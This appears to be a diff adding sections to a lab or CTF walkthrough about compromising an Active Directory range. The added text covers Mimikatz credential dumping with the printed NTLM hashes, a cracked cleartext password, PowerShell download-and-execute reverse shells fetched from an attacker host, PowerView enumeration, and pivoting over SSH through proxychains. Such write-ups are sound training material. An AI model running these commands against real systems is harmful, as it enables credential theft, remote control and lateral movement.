@@ -5,6 +5,8 @@
   - [Kerberoasting](#kerberoasting)
   - [Accessing Nuclear-DC](#accessing-nuclear-dc)
   - [Password Dumping](#password-dumping)
+  - [External Domain Enumeration](#external-domain-enumeration)
+  - [Enumerate Jump Server](#enumerate-jump-server)
 
 ---
 
@@ -109,4 +111,290 @@ As shown, we now have access to `nuclear-dc`.
 <br/>
 
 ## Password Dumping
+
+On the `nuclear-dc`, first download Mimikat:
+
+```
+certutil -urlcache -f http://192.168.100.11/mimikatz.exe .\mimikatz.exe
+```
+
+<br/>
+
+Do a password dumping:
+
+```
+mimikatz "sekurlsa::logonpasswords"
+```
+
+Result:
+```
+C:\Users\Public>mimikatz.exe "token::elevate" "lsadump::lsa"
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+736     {0;000003e7} 1 D 32511          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;000003e7} 0 D 26349641    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,28p)    Primary
+ * Thread Token  : {0;000003e7} 1 D 26384949    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)    Impersonation (Delegation)
+
+mimikatz(commandline) # lsadump::sam
+Domain : NUCLEAR-DC
+SysKey : 923820e623ff23469eb511e2568af60d
+Local SID : S-1-5-21-900803803-229387808-295469279
+
+SAMKey : 901b3393f254bd84fea377c293be5bb9
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 56df9bfe3024dd4eb25b412ead89fe08
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+```
+
+<br/>
+
+Then dump from LSA:
+
+```
+.\mimikatz.exe "token::elevate" "lsadump::lsa /patch"
+```
+
+* Result:
+
+```
+Domain : NUCLEAR / S-1-5-21-2753455963-2528838614-3718188604                                              
+
+RID  : 000001f4 (500)                                
+User : Administrator                                 
+LM   :                                               
+NTLM : 4fc382c2e14308faef3de7494a08f27a              
+
+RID  : 000001f5 (501)                                
+User : Guest                                         
+LM   :                                               
+NTLM :                                               
+
+RID  : 000001f6 (502)                                
+User : krbtgt                                        
+LM   :                                               
+NTLM : c7dd5aac1c29b58e6121b1fcf2c14ce1              
+
+RID  : 000001f7 (503)                                
+User : DefaultAccount                                
+LM   :                                               
+NTLM :                                               
+
+RID  : 0000044f (1103)                               
+User : vdadmin                                       
+LM   :                                               
+NTLM : 1fbba53e43f63e4b29fb31376bd33fda              
+
+RID  : 00000450 (1104)
+User : homi
+LM   : 
+NTLM : 5887aeb7effe2954be747b895907800e
+
+RID  : 00000451 (1105)
+User : iyer
+LM   : 
+NTLM : 1ed88c67da13a44c5d81879baf879d74
+
+RID  : 00000452 (1106)
+User : sri
+LM   : 
+NTLM : 18e7d9e2d44d23e95760a2b3806914f1
+
+RID  : 00000453 (1107)
+User : nuclear-admin
+LM   : 
+NTLM : 3574ac2370c392ad2f8ad0610f3962ec
+
+RID  : 00000454 (1108)
+User : jump-admin
+LM   : 
+NTLM : 2dc9bff397f9e6c9f08a05b18145a7b6
+
+RID  : 00000643 (1603)
+User : iis_svc
+LM   : 
+NTLM : 2dc9bff397f9e6c9f08a05b18145a7b6
+
+RID  : 000003e8 (1000)
+User : NUCLEAR-DC$
+LM   : 
+NTLM : f17fea2b3043c10b2c3c7e9d699f4bc3
+
+RID  : 00000455 (1109)
+User : VDI-SERVER$
+LM   : 
+NTLM : 01da24ec1ae3573740ef5e6caf4d26ce
+
+RID  : 00000457 (1111)
+User : JUMP-SERVER$
+LM   : 
+NTLM : 207aae031b648fd24a27ef3f89ccc426
+
+RID  : 00000641 (1601)
+User : ATOMIC$
+LM   : 
+NTLM : 036422c643c2c192c4dd6d0212ace953
+
+```
+
+
+<br/>
+
+On the local machine, launch a netcat listener:
+
+```
+nc -nlvp 443
+```
+
+<br/>
+
+Obtain a reverse shell by executing the following command on `nuclear-dc`:
+
+```
+iex ((New-Object Net.WebClient).DownloadString("http://192.168.100.11/Invoke-PowerShellTcp.ps1"))
+```
+
+![picture 38](images/3fbbc8629a6d5b086efcc1a30c0b031a1b5569b443e5cfc680799a355660123d.png)  
+
+<br/>
+
+## External Domain Enumeration
+
+First download and import `PowerView_dev.ps1`
+
+```
+iex ((New-Object Net.WebClient).DownloadString("http://192.168.100.11/PowerView_dev.ps1"))
+```
+
+<br/>
+
+**Domain Computer:**
+```
+Get-NetComputer | Select CN, distinguishedname
+```
+
+* Result:
+```
+cn         
+--         
+cn          distinguishedname                                     
+--          -----------------                                     
+NUCLEAR-DC  CN=NUCLEAR-DC,OU=Domain Controllers,DC=nuclear,DC=site
+VDI-SERVER  CN=VDI-SERVER,OU=VDI,DC=nuclear,DC=site               
+JUMP-SERVER CN=JUMP-SERVER,OU=ICS,DC=nuclear,DC=site    
+```
+
+<br/>
+
+```
+Get-NetComputer | Select dnshostname | ForEach-Object { nslookup $_.dnshostname }
+```
+
+* Result:
+
+```
+Name:    Nuclear-DC.nuclear.site
+Address:  10.1.1.3
+
+Name:    VDI-SERVER.nuclear.site
+Address:  10.1.1.8
+
+Name:    Jump-Server.nuclear.site
+Address:  10.1.1.4
+
+```
+
+<br/>
+
+![picture 39](images/cca2de2c68c4e92f90a09e20172e997acc0e99817e4e013f23cd52daf9561d34.png)  
+
+<br/>
+
+**Domain Users:**
+
+```
+Get-NetUser | Select userprincipalname, distinguishedname
+```
+
+* Result:
+
+```
+userprincipalname          distinguishedname                                   
+-----------------          -----------------                                   
+                           CN=Administrator,CN=Users,DC=nuclear,DC=site        
+                           CN=Guest,CN=Users,DC=nuclear,DC=site                
+                           CN=DefaultAccount,CN=Users,DC=nuclear,DC=site       
+                           CN=krbtgt,CN=Users,DC=nuclear,DC=site               
+vdadmin@nuclear.site       CN=VD-Admin,OU=VDI,DC=nuclear,DC=site               
+homi@nuclear.site          CN=Homi Jehangir Bhabha,OU=Scientist,DC=nuclear,D...
+iyer@nuclear.site          CN=Iyer Murty,OU=Scientist,DC=nuclear,DC=site       
+sri@nuclear.site           CN=Srinivasa Krishnan,OU=Scientist,DC=nuclear,DC=...
+nuclear-admin@nuclear.site CN=Nuclear Admin,OU=Priv,DC=nuclear,DC=site         
+jump-admin@nuclear.site    CN=Jump Admin,OU=ICS,DC=nuclear,DC=site             
+iis_svc@nuclear.site       CN=IIS Service Account,CN=Users,DC=nuclear,DC=site
+```
+
+<br/>
+
+## Enumerate Jump Server
+
+Recall we have the following credential:
+
+```
+jump-admin / 2dc9bff397f9e6c9f08a05b18145a7b6
+```
+
+<br/>
+
+Checking on crackstation.net, the cleartext password is revealed:
+
+![picture 40](images/07ded5dcdbbd70fae4842272d12259586e27e708a907a00863a50c5ec2b3ff7c.png)  
+
+Therefore we have the following credential:
+
+* `jump-admin` / `B@DB!tch`
+
+<br/>
+
+Also we know that Jump-Server.nuclear.site (10.1.1.4) is a Ubuntu server. First try to perform a nmap scan:
+
+```
+proxychains nmap -n -Pn -sT -T4 10.1.1.4 --min-rate 5000
+```
+
+![picture 41](images/c7d040a01cebd240d67abc083ffbe9d20170b0fe430ce5c3f7f192236c23c7e8.png)  
+* tcp/22 (SSH) is open
+
+<br/>
+
+Try to access via proxychains:
+
+```
+proxychains ssh jump-admin@10.1.1.4
+```
+
+![picture 42](images/053f255920ed6c32d598f8ff323f51dee6f0e89c6c5497ac89c8ec085a538791.png)  
+
+As shown we can use the credential to access the jump-server.
+
+<br/>
 
